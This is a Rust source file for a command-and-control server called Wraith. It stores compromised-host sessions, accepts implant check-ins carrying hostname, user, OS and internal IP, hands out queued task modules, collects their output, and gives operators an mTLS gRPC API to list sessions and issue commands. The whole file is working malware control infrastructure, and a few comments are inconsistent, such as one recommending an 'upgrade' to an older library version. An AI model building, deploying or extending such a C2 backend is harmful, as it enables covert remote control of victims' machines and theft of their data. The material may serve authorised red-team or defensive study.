use aes_gcm::{Aes256Gcm, aead::{Aead, AeadCore, KeyInit}};
use anyhow::{Context, Result};
use argon2::{Algorithm, Argon2, Params, Version};
use axum::{
    extract::{DefaultBodyLimit, Json, State},
    http::{HeaderMap, StatusCode},
    routing::post,
    Router,
};
use clap::{Parser, Subcommand};
use rand_core::{OsRng, RngCore};
use subtle::ConstantTimeEq;
use rcgen::{
    BasicConstraints, CertificateParams, DnType, ExtendedKeyUsagePurpose,
    IsCa, Issuer, KeyPair, KeyUsagePurpose, SanType,
};
use sqlx::{PgPool, Row};
use std::{
    collections::HashSet,
    net::SocketAddr,
    path::PathBuf,
    sync::{Arc, RwLock},
};
use tokio::net::TcpListener;
use tonic::{Request, Response, Status};
use tonic::transport::{Certificate, Identity, ServerTlsConfig};
use tonic::transport::server::TlsConnectInfo;
use tracing::{info, warn};
use uuid::Uuid;
use x509_parser::certificate::X509Certificate;
use x509_parser::prelude::FromDer;

use shared::{
    proto::{
        orchestrator_server::{Orchestrator, OrchestratorServer},
        Empty, SessionList, SessionSnapshot, SessionTaskList,
        SessionTasksRequest, TaskRequest, TaskResponse, TaskResult,
    },
    ImplantCheckin, ImplantCheckinResponse, ImplantTask, ImplantTaskResult,
};

// ── CLI ───────────────────────────────────────────────────────────────────────

#[derive(Parser)]
#[command(about = "Wraith C2 server")]
struct Args {
    #[arg(long, env = "DATABASE_URL", default_value = "postgres://localhost/wraith")]
    db: String,
    #[arg(long, default_value = "127.0.0.1:50051")]
    grpc_addr: String,
    #[arg(long, default_value = "0.0.0.0:8080")]
    http_addr: String,
    #[arg(long, env = "REDIRECTOR_TOKEN")]
    redirector_token: Option<String>,
    /// Passphrase used to encrypt/decrypt the CA private key (env: CA_PASSPHRASE)
    /// Passphrase used to encrypt/decrypt the CA private key (env: CA_PASSPHRASE).
    /// Required — use --dev-no-passphrase to skip in development environments.
    #[arg(long, env = "CA_PASSPHRASE")]
    ca_passphrase: Option<String>,
    /// Skip CA passphrase requirement (development only — never use in production)
    #[arg(long, default_value_t = false)]
    dev_no_passphrase: bool,
    #[command(subcommand)]
    command: Option<Cmd>,
}

#[derive(Subcommand)]
enum Cmd {
    /// Provision a new operator certificate (mTLS identity)
    ProvisionOperator {
        #[arg(long, default_value = "operator")]
        username: String,
        #[arg(long, default_value = "operator")]
        role: String,
        /// Directory to write cert/key files into (stdout if omitted)
        #[arg(long)]
        out_dir: Option<PathBuf>,
    },
    /// Revoke an operator certificate by username
    RevokeOperator {
        #[arg(long)]
        username: String,
    },
}

// ── Shared state ──────────────────────────────────────────────────────────────

#[derive(Clone)]
struct AppState {
    db:               PgPool,
    redirector_token: Option<String>,
    revoked_serials:  Arc<RwLock<HashSet<String>>>,
    ca_cert_der:      Arc<Vec<u8>>,
}

impl AppState {
    fn check_redirector(&self, headers: &HeaderMap) -> bool {
        match &self.redirector_token {
            None => true,
            Some(expected) => headers
                .get("x-wraith-redirector-token")
                .and_then(|v| v.to_str().ok())
                .map(|v| v.as_bytes().ct_eq(expected.as_bytes()).into())
                .unwrap_or(false),
        }
    }
}

// ── Database schema ───────────────────────────────────────────────────────────

async fn init_db(pool: &PgPool) -> Result<()> {
    sqlx::query(
        "CREATE TABLE IF NOT EXISTS ca_state (
            id                INTEGER PRIMARY KEY DEFAULT 1,
            ca_cert_pem       TEXT  NOT NULL,
            ca_key_enc        BYTEA NOT NULL,
            ca_key_nonce      BYTEA NOT NULL,
            kdf_salt          BYTEA NOT NULL,
            server_cert_pem   TEXT  NOT NULL,
            server_key_enc    BYTEA NOT NULL,
            server_key_nonce  BYTEA NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create ca_state table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS operator_certs (
            username   TEXT PRIMARY KEY,
            role       TEXT NOT NULL,
            cert_pem   TEXT NOT NULL,
            serial     TEXT NOT NULL,
            expires_at TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create operator_certs table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS crl (
            serial     TEXT PRIMARY KEY,
            revoked_at TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create crl table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS implant_sessions (
            session_id TEXT PRIMARY KEY,
            hostname   TEXT NOT NULL,
            username   TEXT NOT NULL,
            os         TEXT NOT NULL,
            arch       TEXT NOT NULL,
            ip         TEXT NOT NULL,
            profile    TEXT NOT NULL,
            last_seen  TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create implant_sessions table")?;

    sqlx::query(
        "CREATE TABLE IF NOT EXISTS implant_tasks (
            task_id    TEXT PRIMARY KEY,
            session_id TEXT NOT NULL,
            module     TEXT NOT NULL,
            args       TEXT NOT NULL,
            status     TEXT NOT NULL DEFAULT 'pending',
            output     TEXT NOT NULL DEFAULT '',
            queued_at  TEXT NOT NULL
        )",
    )
    .execute(pool)
    .await
    .context("create implant_tasks table")?;

    Ok(())
}

// ── Crypto helpers ─────────────────────────────────────────────────────────────

fn derive_key(passphrase: &str, salt: &[u8]) -> [u8; 32] {
    // Params locked to explicit values — never use Params::default() here because
    // a future crate version changing the defaults would silently make the CA key
    // unreadable. m=19 MB, t=2 iterations, p=1 lane.
    let params = Params::new(19_456, 2, 1, None).expect("argon2 params valid");
    let mut key = [0u8; 32];
    Argon2::new(Algorithm::Argon2id, Version::V0x13, params)
        .hash_password_into(passphrase.as_bytes(), salt, &mut key)
        .expect("argon2 kdf failed");
    key
}

fn aes_encrypt(key: &[u8; 32], plaintext: &[u8]) -> Result<(Vec<u8>, Vec<u8>)> {
    let k      = aes_gcm::Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(k);
    let nonce  = Aes256Gcm::generate_nonce(&mut aes_gcm::aead::OsRng);
    let ct     = cipher
        .encrypt(&nonce, plaintext)
        .map_err(|e| anyhow::anyhow!("aes-gcm encrypt: {e}"))?;
    Ok((ct, nonce.to_vec()))
}

fn aes_decrypt(key: &[u8; 32], ct: &[u8], nonce: &[u8]) -> Result<Vec<u8>> {
    let k      = aes_gcm::Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(k);
    let nonce  = aes_gcm::Nonce::from_slice(nonce);
    cipher
        .decrypt(nonce, ct)
        .map_err(|e| anyhow::anyhow!("aes-gcm decrypt: {e}"))
}

// ── CA management ─────────────────────────────────────────────────────────────

struct CaContext {
    ca_cert_pem:    String,
    ca_key_pem:     String,
    server_cert_pem: String,
    server_key_pem:  String,
}

async fn ensure_ca(pool: &PgPool, passphrase: &str) -> Result<CaContext> {
    let row = sqlx::query(
        "SELECT ca_cert_pem, ca_key_enc, ca_key_nonce, kdf_salt,
                server_cert_pem, server_key_enc, server_key_nonce
         FROM ca_state WHERE id = 1",
    )
    .fetch_optional(pool)
    .await?;

    if let Some(r) = row {
        let salt:        Vec<u8> = r.get("kdf_salt");
        let key = derive_key(passphrase, &salt);

        let ca_key_enc:   Vec<u8> = r.get("ca_key_enc");
        let ca_key_nonce: Vec<u8> = r.get("ca_key_nonce");
        let ca_key_bytes = aes_decrypt(&key, &ca_key_enc, &ca_key_nonce)
            .context("failed to decrypt CA key — wrong passphrase?")?;

        let sv_key_enc:   Vec<u8> = r.get("server_key_enc");
        let sv_key_nonce: Vec<u8> = r.get("server_key_nonce");
        let sv_key_bytes = aes_decrypt(&key, &sv_key_enc, &sv_key_nonce)
            .context("failed to decrypt server key")?;

        return Ok(CaContext {
            ca_cert_pem:     r.get("ca_cert_pem"),
            ca_key_pem:      String::from_utf8(ca_key_bytes)?,
            server_cert_pem: r.get("server_cert_pem"),
            server_key_pem:  String::from_utf8(sv_key_bytes)?,
        });
    }

    info!("no CA found — generating new CA and server cert...");

    // CA keypair + self-signed cert
    let ca_key = KeyPair::generate()?;
    let ca_key_pem = ca_key.serialize_pem();  // save before moving into Issuer
    let mut ca_params = CertificateParams::default();
    ca_params.is_ca = IsCa::Ca(BasicConstraints::Constrained(0));
    ca_params.distinguished_name.push(DnType::CommonName, "Wraith CA");
    ca_params.key_usages = vec![KeyUsagePurpose::KeyCertSign, KeyUsagePurpose::CrlSign];
    ca_params.not_before = ::time::OffsetDateTime::now_utc();
    ca_params.not_after  = ::time::OffsetDateTime::now_utc() + ::time::Duration::days(3650);
    let ca_cert = ca_params.self_signed(&ca_key)?;
    let ca_cert_pem = ca_cert.pem();

    // Build an Issuer from the CA cert + key for signing downstream certs
    let ca_issuer = Issuer::from_ca_cert_pem(&ca_cert_pem, ca_key)?;

    // Server keypair + cert signed by CA
    let sv_key = KeyPair::generate()?;
    let sv_key_pem = sv_key.serialize_pem();
    let mut sv_params = CertificateParams::default();
    sv_params.distinguished_name.push(DnType::CommonName, "Wraith Server");
    sv_params.subject_alt_names = vec![SanType::DnsName("wraith-server".try_into()?)];
    sv_params.extended_key_usages = vec![ExtendedKeyUsagePurpose::ServerAuth];
    sv_params.not_before = ::time::OffsetDateTime::now_utc();
    sv_params.not_after  = ::time::OffsetDateTime::now_utc() + ::time::Duration::days(365);
    let sv_cert = sv_params.signed_by(&sv_key, &ca_issuer)?;

    let sv_cert_pem = sv_cert.pem();

    // Encrypt both private keys
    let mut salt = vec![0u8; 16];
    OsRng.fill_bytes(&mut salt);
    let aes_key = derive_key(passphrase, &salt);

    let (ca_key_enc, ca_key_nonce) = aes_encrypt(&aes_key, ca_key_pem.as_bytes())?;
    let (sv_key_enc, sv_key_nonce) = aes_encrypt(&aes_key, sv_key_pem.as_bytes())?;

    sqlx::query(
        "INSERT INTO ca_state
         (id, ca_cert_pem, ca_key_enc, ca_key_nonce, kdf_salt,
          server_cert_pem, server_key_enc, server_key_nonce)
         VALUES (1,$1,$2,$3,$4,$5,$6,$7)",
    )
    .bind(&ca_cert_pem)
    .bind(&ca_key_enc)
    .bind(&ca_key_nonce)
    .bind(&salt)
    .bind(&sv_cert_pem)
    .bind(&sv_key_enc)
    .bind(&sv_key_nonce)
    .execute(pool)
    .await?;

    info!("CA generated and stored.");
    Ok(CaContext {
        ca_cert_pem,
        ca_key_pem,
        server_cert_pem: sv_cert_pem,
        server_key_pem:  sv_key_pem,
    })
}

async fn provision_operator(
    pool:       &PgPool,
    ca:         &CaContext,
    username:   &str,
    role:       &str,
) -> Result<(String, String)> {
    let op_key = KeyPair::generate()?;
    let mut params = CertificateParams::default();
    params.distinguished_name.push(DnType::CommonName, username);
    params.distinguished_name.push(DnType::OrganizationalUnitName, role);
    params.key_usages          = vec![KeyUsagePurpose::DigitalSignature];
    params.extended_key_usages = vec![ExtendedKeyUsagePurpose::ClientAuth];
    params.not_before = ::time::OffsetDateTime::now_utc();
    params.not_after  = ::time::OffsetDateTime::now_utc() + ::time::Duration::days(7);

    // Reconstruct CA issuer from stored cert + key for signing
    let ca_key    = KeyPair::from_pem(&ca.ca_key_pem)?;
    let ca_issuer = Issuer::from_ca_cert_pem(&ca.ca_cert_pem, ca_key)?;

    let op_cert    = params.signed_by(&op_key, &ca_issuer)?;
    let cert_pem   = op_cert.pem();
    let key_pem    = op_key.serialize_pem();
    let expires_at = (chrono::Utc::now() + chrono::Duration::days(7))
        .format("%Y-%m-%d %H:%M:%S %z")
        .to_string();

    // If this username already has a cert, revoke the old serial before overwriting.
    // Without this, re-provisioning would leave the old cert valid for its remaining lifetime.
    let old_serial: Option<String> =
        sqlx::query_scalar("SELECT serial FROM operator_certs WHERE username=$1")
            .bind(username)
            .fetch_optional(pool)
            .await?;

    if let Some(old) = old_serial {
        sqlx::query(
            "INSERT INTO crl (serial, revoked_at) VALUES ($1,$2) ON CONFLICT(serial) DO NOTHING",
        )
        .bind(&old)
        .bind(chrono_now())
        .execute(pool)
        .await?;
        info!("old cert serial {old} for '{username}' added to CRL before re-issue");
    }

    let serial = cert_serial(cert_pem.as_bytes())?;

    sqlx::query(
        "INSERT INTO operator_certs (username, role, cert_pem, serial, expires_at)
         VALUES ($1,$2,$3,$4,$5)
         ON CONFLICT(username) DO UPDATE SET
           role=EXCLUDED.role, cert_pem=EXCLUDED.cert_pem,
           serial=EXCLUDED.serial, expires_at=EXCLUDED.expires_at",
    )
    .bind(username)
    .bind(role)
    .bind(&cert_pem)
    .bind(&serial)
    .bind(&expires_at)
    .execute(pool)
    .await?;

    Ok((cert_pem, key_pem))
}

async fn revoke_operator(pool: &PgPool, username: &str) -> Result<()> {
    let row = sqlx::query("SELECT serial FROM operator_certs WHERE username=$1")
        .bind(username)
        .fetch_optional(pool)
        .await?;

    let Some(row) = row else {
        anyhow::bail!("operator '{username}' not found");
    };
    let serial: String = row.get("serial");

    sqlx::query(
        "INSERT INTO crl (serial, revoked_at) VALUES ($1,$2)
         ON CONFLICT(serial) DO NOTHING",
    )
    .bind(&serial)
    .bind(chrono_now())
    .execute(pool)
    .await?;

    info!("operator '{username}' (serial {serial}) revoked");
    Ok(())
}

async fn load_revoked(pool: &PgPool) -> Result<HashSet<String>> {
    let rows = sqlx::query("SELECT serial FROM crl")
        .fetch_all(pool)
        .await?;
    Ok(rows.iter().map(|r| r.get::<String, _>("serial")).collect())
}

fn cert_serial(pem_bytes: &[u8]) -> Result<String> {
    let (_, pem) = x509_parser::pem::parse_x509_pem(pem_bytes)
        .map_err(|e| anyhow::anyhow!("PEM parse: {e:?}"))?;
    let (_, cert) = X509Certificate::from_der(&pem.contents)
        .map_err(|e| anyhow::anyhow!("cert parse: {e:?}"))?;
    Ok(format!("{:x}", cert.tbs_certificate.serial))
}

// ── TLS config ────────────────────────────────────────────────────────────────

fn build_grpc_tls(ca: &CaContext) -> Result<ServerTlsConfig> {
    let identity = Identity::from_pem(&ca.server_cert_pem, &ca.server_key_pem);
    let ca_cert  = Certificate::from_pem(&ca.ca_cert_pem);
    // Known limitation: tonic 0.14's ServerTlsConfig does not expose the underlying
    // rustls ServerConfig, so we cannot restrict to TLS 1.3-only here. rustls 0.23
    // still supports TLS 1.2 with strong cipher suites (ECDHE+AESGCM only), so
    // forward secrecy is preserved even on 1.2 connections. Upgrading to tonic 0.12+
    // with a custom ServerConfig would allow enforcing TLS 1.3 exclusively.
    Ok(ServerTlsConfig::new()
        .identity(identity)
        .client_ca_root(ca_cert))
}

// ── Peer identity extraction ──────────────────────────────────────────────────

fn peer_identity<T>(
    req:         &Request<T>,
    revoked:     &HashSet<String>,
    ca_cert_der: &[u8],
) -> Result<(String, String), Status> {
    let certs = req
        .extensions()
        .get::<TlsConnectInfo<tonic::transport::server::TcpConnectInfo>>()
        .and_then(|i| i.peer_certs())
        .ok_or_else(|| Status::unauthenticated("no client certificate"))?;

    let der = certs
        .first()
        .ok_or_else(|| Status::unauthenticated("empty cert chain"))?;

    let (_, cert) = X509Certificate::from_der(der.as_ref())
        .map_err(|_| Status::unauthenticated("malformed certificate"))?;

    // Defense-in-depth: verify the cert was signed by our CA and has not expired.
    // rustls/tonic already enforce this at the TLS layer, but we re-check here so
    // the application layer is not solely dependent on the transport's behaviour.
    let (_, ca_cert) = X509Certificate::from_der(ca_cert_der)
        .map_err(|_| Status::internal("CA cert parse failed"))?;
    if let Err(e) = cert.verify_signature(Some(&ca_cert.tbs_certificate.subject_pki)) {
        warn!("client cert signature verification failed: {e:?}");
        return Err(Status::unauthenticated("certificate not signed by trusted CA"));
    }
    let now_ts = chrono::Utc::now().timestamp();
    if cert.validity().not_after.timestamp() < now_ts {
        return Err(Status::unauthenticated("certificate expired"));
    }
    if cert.validity().not_before.timestamp() > now_ts {
        return Err(Status::unauthenticated("certificate not yet valid"));
    }

    let serial = format!("{:x}", cert.tbs_certificate.serial);
    if revoked.contains(&serial) {
        return Err(Status::unauthenticated("certificate revoked"));
    }

    let cn = cert
        .subject()
        .iter_common_name()
        .next()
        .and_then(|a| a.as_str().ok())
        .ok_or_else(|| Status::unauthenticated("certificate missing CN"))?
        .to_string();

    let role = cert
        .subject()
        .iter_organizational_unit()
        .next()
        .and_then(|a| a.as_str().ok())
        .unwrap_or("operator")
        .to_string();

    Ok((cn, role))
}

// ── Database helpers ──────────────────────────────────────────────────────────

async fn upsert_session(pool: &PgPool, c: &ImplantCheckin, sid: &str) -> Result<()> {
    let now = chrono_now();
    sqlx::query(
        "INSERT INTO implant_sessions (session_id,hostname,username,os,arch,ip,profile,last_seen)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8)
         ON CONFLICT(session_id) DO UPDATE SET
           hostname=EXCLUDED.hostname, username=EXCLUDED.username,
           os=EXCLUDED.os, arch=EXCLUDED.arch,
           ip=EXCLUDED.ip, profile=EXCLUDED.profile, last_seen=EXCLUDED.last_seen",
    )
    .bind(sid)
    .bind(&c.hostname)
    .bind(&c.username)
    .bind(&c.os)
    .bind(&c.arch)
    .bind(&c.internal_ip)
    .bind(&c.profile)
    .bind(&now)
    .execute(pool)
    .await?;
    Ok(())
}

async fn pop_pending_tasks(pool: &PgPool, session_id: &str) -> Result<Vec<ImplantTask>> {
    let rows = sqlx::query(
        "SELECT task_id, module, args FROM implant_tasks
         WHERE session_id = $1 AND status = 'pending'",
    )
    .bind(session_id)
    .fetch_all(pool)
    .await?;

    let tasks: Vec<ImplantTask> = rows
        .iter()
        .map(|r| ImplantTask {
            task_id: r.get("task_id"),
            module:  r.get("module"),
            args:    serde_json::from_str(r.get::<&str, _>("args")).unwrap_or_default(),
        })
        .collect();

    for t in &tasks {
        sqlx::query("UPDATE implant_tasks SET status='sent' WHERE task_id=$1")
            .bind(&t.task_id)
            .execute(pool)
            .await?;
    }
    Ok(tasks)
}

async fn record_result(pool: &PgPool, r: &ImplantTaskResult) -> Result<()> {
    let status = if r.success { "completed" } else { "failed" };
    // Require task_id AND session_id to match — prevents one implant from writing
    // results into another session's tasks even if it somehow learns a task UUID.
    sqlx::query(
        "UPDATE implant_tasks SET status=$1, output=$2
         WHERE task_id=$3 AND session_id=$4",
    )
    .bind(status)
    .bind(r.output.to_string())
    .bind(&r.task_id)
    .bind(&r.session_id)
    .execute(pool)
    .await?;
    Ok(())
}

fn chrono_now() -> String {
    chrono::Utc::now().format("%Y-%m-%d %H:%M:%S %z").to_string()
}

// ── HTTP handlers (implant-facing) ────────────────────────────────────────────

async fn handle_checkin(
    State(state): State<AppState>,
    headers: HeaderMap,
    Json(body): Json<ImplantCheckin>,
) -> Result<Json<ImplantCheckinResponse>, StatusCode> {
    if !state.check_redirector(&headers) {
        return Err(StatusCode::UNAUTHORIZED);
    }

    let sid = match body.session_id.as_deref() {
        // First checkin — server assigns the ID
        None => Uuid::new_v4().to_string(),
        Some(claimed) => {
            // Only honour the client-supplied ID if it was previously issued by this server.
            // An unrecognised ID (DB wiped, spoofed) gets a fresh UUID so the implant
            // re-registers cleanly instead of claiming a session that doesn't exist.
            let known: bool = sqlx::query_scalar(
                "SELECT EXISTS(SELECT 1 FROM implant_sessions WHERE session_id=$1)",
            )
            .bind(claimed)
            .fetch_one(&state.db)
            .await
            .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;

            if known { claimed.to_string() } else { Uuid::new_v4().to_string() }
        }
    };

    upsert_session(&state.db, &body, &sid)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    let tasks = pop_pending_tasks(&state.db, &sid)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(Json(ImplantCheckinResponse { session_id: sid, tasks }))
}

async fn handle_result(
    State(state): State<AppState>,
    headers: HeaderMap,
    Json(body): Json<ImplantTaskResult>,
) -> Result<StatusCode, StatusCode> {
    if !state.check_redirector(&headers) {
        return Err(StatusCode::UNAUTHORIZED);
    }
    record_result(&state.db, &body)
        .await
        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
    Ok(StatusCode::OK)
}

// ── gRPC service ──────────────────────────────────────────────────────────────

struct GrpcApi {
    state: AppState,
}

#[tonic::async_trait]
impl Orchestrator for GrpcApi {
    async fn list_sessions(
        &self,
        req: Request<Empty>,
    ) -> Result<Response<SessionList>, Status> {
        {
            let revoked = self.state.revoked_serials.read().unwrap_or_else(|e| e.into_inner());
            peer_identity(&req, &revoked, &self.state.ca_cert_der)
        }?;

        let rows = sqlx::query(
            "SELECT session_id,hostname,username,os,arch,ip,profile,last_seen
             FROM implant_sessions ORDER BY last_seen DESC",
        )
        .fetch_all(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        let cutoff = chrono::Utc::now() - chrono::Duration::minutes(2);
        let sessions = rows
            .iter()
            .map(|r| {
                let last_seen: String = r.get("last_seen");
                let active =
                    chrono::DateTime::parse_from_str(&last_seen, "%Y-%m-%d %H:%M:%S %z")
                        .map(|t| t.with_timezone(&chrono::Utc) > cutoff)
                        .unwrap_or(false);
                SessionSnapshot {
                    session_id:  r.get("session_id"),
                    hostname:    r.get("hostname"),
                    username:    r.get("username"),
                    os:          r.get("os"),
                    arch:        r.get("arch"),
                    internal_ip: r.get("ip"),
                    profile:     r.get("profile"),
                    last_seen,
                    active,
                }
            })
            .collect();

        Ok(Response::new(SessionList { sessions }))
    }

    async fn task_session(
        &self,
        req: Request<TaskRequest>,
    ) -> Result<Response<TaskResponse>, Status> {
        {
            let revoked = self.state.revoked_serials.read().unwrap_or_else(|e| e.into_inner());
            peer_identity(&req, &revoked, &self.state.ca_cert_der)
        }?;

        let r       = req.into_inner();
        let task_id = Uuid::new_v4().to_string();
        let args_json = serde_json::to_string(&r.args).unwrap_or_default();
        sqlx::query(
            "INSERT INTO implant_tasks (task_id,session_id,module,args,status,queued_at)
             VALUES ($1,$2,$3,$4,'pending',$5)",
        )
        .bind(&task_id)
        .bind(&r.session_id)
        .bind(&r.module)
        .bind(&args_json)
        .bind(chrono_now())
        .execute(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        Ok(Response::new(TaskResponse { task_id }))
    }

    async fn list_session_tasks(
        &self,
        req: Request<SessionTasksRequest>,
    ) -> Result<Response<SessionTaskList>, Status> {
        {
            let revoked = self.state.revoked_serials.read().unwrap_or_else(|e| e.into_inner());
            peer_identity(&req, &revoked, &self.state.ca_cert_der)
        }?;

        let session_id = req.into_inner().session_id;
        let rows = sqlx::query(
            "SELECT task_id,module,args,status,output,queued_at
             FROM implant_tasks WHERE session_id=$1 ORDER BY queued_at DESC",
        )
        .bind(&session_id)
        .fetch_all(&self.state.db)
        .await
        .map_err(|e| Status::internal(e.to_string()))?;

        let tasks = rows
            .iter()
            .map(|r| TaskResult {
                task_id:     r.get("task_id"),
                module:      r.get("module"),
                args:        serde_json::from_str(r.get::<&str, _>("args")).unwrap_or_default(),
                status:      r.get("status"),
                output_json: r.get("output"),
                queued_at:   r.get("queued_at"),
            })
            .collect();

        Ok(Response::new(SessionTaskList { tasks }))
    }
}

// ── File helpers ──────────────────────────────────────────────────────────────

// Writes `content` to `path` with mode 0600 (owner read/write only).
// On non-Unix the mode is a no-op; the write still happens.
async fn write_secret_file(path: &std::path::Path, content: &[u8]) -> Result<()> {
    #[cfg(unix)]
    {
        use std::io::Write as _;
        use std::os::unix::fs::OpenOptionsExt as _;
        use std::os::unix::fs::PermissionsExt as _;
        let path    = path.to_owned();
        let content = content.to_owned();
        tokio::task::spawn_blocking(move || -> std::io::Result<()> {
            // mode(0o600) only applies to *new* files; set_permissions handles existing files.
            let mut f = std::fs::OpenOptions::new()
                .write(true).create(true).truncate(true).mode(0o600)
                .open(&path)?;
            f.write_all(&content)?;
            f.set_permissions(std::fs::Permissions::from_mode(0o600))
        })
        .await
        .context("key file write task panicked")?
        .context("writing secret file")?;
    }
    #[cfg(not(unix))]
    tokio::fs::write(path, content).await?;
    Ok(())
}

// ── main ──────────────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info")),
        )
        .init();
    let args = Args::parse();

    let passphrase: String = match (args.ca_passphrase, args.dev_no_passphrase) {
        (Some(p), _) if !p.is_empty() => p,
        (_, true) => {
            warn!("--dev-no-passphrase set: CA key has NO encryption. Never use this in production.");
            String::new()
        }
        (Some(_), false) => {
            anyhow::bail!(
                "CA_PASSPHRASE is empty. Provide a strong passphrase via --ca-passphrase / \
                 CA_PASSPHRASE env var, or pass --dev-no-passphrase to explicitly opt out (dev only)."
            );
        }
        (None, false) => {
            anyhow::bail!(
                "CA_PASSPHRASE not set. Provide a strong passphrase via --ca-passphrase / \
                 CA_PASSPHRASE env var, or pass --dev-no-passphrase to explicitly opt out (dev only)."
            );
        }
    };

    let pool = PgPool::connect(&args.db)
        .await
        .context("failed to connect to PostgreSQL")?;
    init_db(&pool).await?;

    let ca = ensure_ca(&pool, &passphrase).await?;

    match args.command {
        Some(Cmd::ProvisionOperator { username, role, out_dir }) => {
            let (cert_pem, key_pem) = provision_operator(&pool, &ca, &username, &role).await?;
            println!("Operator '{username}' (role: {role}) provisioned. Cert valid 7 days.");

            if let Some(dir) = out_dir {
                tokio::fs::create_dir_all(&dir).await?;
                let cert_path = dir.join(format!("{username}.cert.pem"));
                let key_path  = dir.join(format!("{username}.key.pem"));
                let ca_path   = dir.join("ca.cert.pem");
                tokio::fs::write(&cert_path, cert_pem.as_bytes()).await?;
                write_secret_file(&key_path, key_pem.as_bytes()).await?;
                tokio::fs::write(&ca_path, ca.ca_cert_pem.as_bytes()).await?;
                println!("Files written:");
                println!("  {}", cert_path.display());
                println!("  {}", key_path.display());
                println!("  {}", ca_path.display());
            } else {
                println!("\n=== CA CERT (save as ca.cert.pem) ===");
                print!("{}", ca.ca_cert_pem);
                println!("=== OPERATOR CERT (save as {username}.cert.pem) ===");
                print!("{cert_pem}");
                println!("=== OPERATOR KEY (save as {username}.key.pem — keep secret) ===");
                print!("{key_pem}");
            }
            return Ok(());
        }

        Some(Cmd::RevokeOperator { username }) => {
            revoke_operator(&pool, &username).await?;
            println!("Operator '{username}' revoked. Takes effect on next gRPC connection attempt.");
            return Ok(());
        }

        None => {}
    }

    // Extract CA cert DER while we still hold the CaContext.
    // This is stored in AppState so peer_identity can verify client certs were signed
    // by our CA — tonic 0.14 / rustls 0.23 does not enforce this at the TLS layer.
    let ca_cert_der = {
        let (_, pem) = x509_parser::pem::parse_x509_pem(ca.ca_cert_pem.as_bytes())
            .map_err(|e| anyhow::anyhow!("CA cert PEM parse: {e:?}"))?;
        Arc::new(pem.contents)
    };

    // Load initial CRL
    let revoked_serials = Arc::new(RwLock::new(
        load_revoked(&pool).await.unwrap_or_default(),
    ));

    // Background CRL refresh every 60 s
    {
        let pool2    = pool.clone();
        let revoked2 = revoked_serials.clone();
        tokio::spawn(async move {
            let mut interval = tokio::time::interval(std::time::Duration::from_secs(60));
            loop {
                interval.tick().await;
                match load_revoked(&pool2).await {
                    Ok(s) => { *revoked2.write().unwrap_or_else(|e| e.into_inner()) = s; }
                    Err(e) => warn!("CRL refresh failed: {e}"),
                }
            }
        });
    }

    let grpc_addr: SocketAddr = args.grpc_addr.parse()?;
    let grpc_tls = build_grpc_tls(&ca)?;
    // CA private key is only needed for cert provisioning (a separate process invocation).
    // Drop the entire CaContext now so the CA key doesn't sit in RAM for the server's lifetime.
    drop(ca);

    let state = AppState {
        db:               pool.clone(),
        redirector_token: args.redirector_token.clone(),
        revoked_serials,
        ca_cert_der,
    };

    let http_app = Router::new()
        .route("/implant/checkin", post(handle_checkin))
        .route("/implant/result",  post(handle_result))
        .layer(DefaultBodyLimit::max(1024 * 1024))  // 1 MB — prevents DB bloat / DoS
        .with_state(state.clone());

    let http_addr: SocketAddr = args.http_addr.parse()?;
    let http_listener = TcpListener::bind(http_addr).await?;
    info!("HTTP listening on {http_addr}");
    info!("gRPC (mTLS) listening on {grpc_addr}");

    tokio::try_join!(
        async {
            axum::serve(http_listener, http_app)
                .await
                .context("HTTP server failed")
        },
        async {
            tonic::transport::Server::builder()
                .tls_config(grpc_tls)
                .context("gRPC TLS config failed")?
                .add_service(OrchestratorServer::new(GrpcApi { state }))
                .serve(grpc_addr)
                .await
                .context("gRPC server failed")
        },
    )?;

    Ok(())
}
